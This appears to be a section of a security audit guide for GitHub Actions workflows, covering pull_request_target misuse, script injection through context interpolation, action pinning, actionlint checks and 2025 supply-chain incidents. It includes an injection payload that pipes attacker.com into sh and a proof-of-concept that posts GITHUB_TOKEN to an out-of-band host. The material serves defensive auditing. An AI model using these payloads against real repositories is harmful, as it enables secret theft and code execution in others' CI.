## Phase 2: GitHub Actions Workflow Analysis

### Critical Vulnerability: `pull_request_target` with Checkout

```yaml
# VULNERABLE: pull_request_target checks out untrusted PR code with write permissions
name: CI
on:
  pull_request_target:   # ← DANGER: runs with repo secrets
    types: [opened]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
        with:
          ref: ${{ github.event.pull_request.head.sha }}  # ← checks out attacker code
      - run: npm ci && npm test  # ← executes attacker-controlled code with secrets
```

**Detection pattern**: Workflow uses `pull_request_target` AND `actions/checkout` with
`ref: github.event.pull_request.head.*`.

**Impact**: External contributor opens a PR, their code executes in workflow with
`GITHUB_TOKEN` (write) and any `secrets.*` values exposed. CVSS: 9.3 (Critical).

### Workflow Risk Scoring

```yaml
workflow_risk_matrix:
  CRITICAL:
    - trigger: pull_request_target + checkout attacker ref
      impact: secrets exfiltration + arbitrary code execution
    - trigger: workflow_dispatch with unsanitized inputs → shell injection
      impact: arbitrary command execution in CI
    - trigger: >
        unsafe context interpolation — ${{ github.event.pull_request.title }},
        ${{ github.head_ref }}, or any *.body / *.comment field used directly
        in a run: step or actions/github-script without env: indirection
        (CVE-2026-27701 class; key vector in 2025 worm campaigns)
      impact: script injection RCE in CI runner with full repository secrets access
    - trigger: >
        compromised transitive action dependency — stolen maintainer token or
        malicious commit injects exfil step into popular action
        (GhostAction Sep 2025: 3,325 secrets across 817 repos;
        tj-actions/changed-files: 22,000+ repos affected)
      impact: mass secrets exfiltration via transitive action supply chain
    - trigger: >
        self-hosted runner installed by malicious package preinstall script
        (Shai Hulud / Shai-Hulud 2.0 worm Sep–Nov 2025: backdoor on:push
        and on:discussion_comment workflows; propagated via stolen tokens
        to tens of thousands of repos; installed persistent self-hosted runners)
      impact: persistent CI backdoor + lateral movement to internal network

  HIGH:
    - trigger: pull_request + unpin action at major version (actions/checkout@v3 vs @f417a24)
      impact: action poisoning if maintainer account compromised
    - trigger: third-party action with broad permissions
      impact: supply chain via third-party maintainer compromise
    - trigger: self-hosted runner on public repo
      impact: lateral movement from CI to internal network

  MEDIUM:
    - trigger: ACTIONS_RUNNER_DEBUG: true committed
      impact: debug token exposure in logs
    - trigger: secrets.* passed as environment variable
      impact: log exposure if step echoes env
    - trigger: workflow creates GitHub releases with unsigned artifacts
      impact: build artifact tampering
```

### Workflow Analysis Checklist

For each workflow file:
- [ ] Trigger: is `pull_request_target` used? → check for unsafe checkout
- [ ] Trigger: is `workflow_dispatch` used with user inputs? → check for injection
- [ ] Actions: are all external actions pinned to full SHA? → check for version poisoning
- [ ] Permissions: is `GITHUB_TOKEN` granted `write-all` or `contents: write`? → minimum required?
- [ ] Secrets: are secrets passed via env vars? → any `echo $SECRET` risk?
- [ ] Runners: are self-hosted runners used on public repos? → lateral movement risk
- [ ] Artifacts: are release artifacts signed / checksummed? → tampering detection
- [ ] Context injection: do any `run:` steps or `actions/github-script` blocks
      use `${{ github.event.pull_request.title }}`, `${{ github.head_ref }}`,
      `${{ github.event.*.body }}`, or `${{ github.event.comment.* }}` directly
      without passing through an `env:` variable first?
- [ ] Action pinning: are all `uses:` references pinned to a full commit SHA
      (e.g., `actions/checkout@f417a24b...`) rather than a mutable tag (`@v3`, `@main`)?

### Actionlint Static Analysis

Run `actionlint` (rhysd/actionlint) against every discovered workflow file — it
detects script injection, insecure permissions, and credential exposure patterns:

```bash
# actionlint: open-source GitHub Actions static analyzer
# Install: go install github.com/rhysd/actionlint/cmd/actionlint@latest
actionlint .github/workflows/*.yml \
  -format '{{range $e := .}}{{$e.Filepath}}:{{$e.Line}}: [{{$e.RuleID}}] {{$e.Message}}\n{{end}}'

# Key security rule IDs:
#   expression     — ${{ }} interpolation of untrusted data in run: (script injection)
#   permissions    — overly broad GITHUB_TOKEN scope
#   credentials    — secrets used in risky positions
#   runner-context — unsafe runner context values
```

**Unsafe context interpolation — primary 2025–2026 injection vector:**

```yaml
# VULNERABLE: PR title injected into run: step (title='; curl attacker.com | sh')
- run: echo "Testing PR: ${{ github.event.pull_request.title }}"

# VULNERABLE: issue body fed into actions/github-script without sanitization
- uses: actions/github-script@v6
  with:
    script: |
      const body = '${{ github.event.issue.body }}';  # script injection

# VULNERABLE: branch name in environment variable via untrusted ref
- run: git checkout ${{ github.head_ref }}  # branch name is attacker-controlled

# SAFE PATTERN: pass via env: — shell variable, not a GHA expression
- name: Process PR title
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: echo "Testing: $PR_TITLE"  # $PR_TITLE is a shell var — no injection
```

**2025 incidents confirming these attack classes:**
- **GhostAction (Sep 2025)**: Compromised maintainer tokens injected malicious exfil steps
  into widely-used actions; 3,325+ secrets (PyPI/npm/DockerHub/GitHub tokens) stolen
  across 817 repos and 327 users. Vector: transitive action dependency.
- **Shai Hulud / Shai-Hulud 2.0 (Sep–Nov 2025)**: Self-replicating npm worm. Malicious
  `preinstall` scripts stole CI tokens, created backdoor `on:push` + `on:discussion_comment`
  workflows, installed self-hosted runners, and propagated to tens of thousands of repos
  via stolen `GITHUB_TOKEN` values.
- **tj-actions/changed-files**: Single malicious commit printed all CI secrets to workflow
  logs; publicly accessible; affected 22,000+ repos before removal.
- **CVE-2026-27701**: `${{ github.event.pull_request.title }}` in `run:` → RCE in any
  workflow processing external contributor PRs without `env:` indirection.

### Pull Request Target PoC

```python
# PoC demonstrates that an external PR can execute arbitrary code
# NOTE: Only for authorized research against owned test repositories
poc_pr_content = """
# Malicious test file in attacker's PR branch
# This script would run with CI secrets if workflow is vulnerable

import os
import requests

# Exfiltrate secrets via OOB channel
secret = os.environ.get('GITHUB_TOKEN', 'not_found')
requests.post('https://{{oob_domain}}/secrets', data={'token': secret[:20]})
"""
```

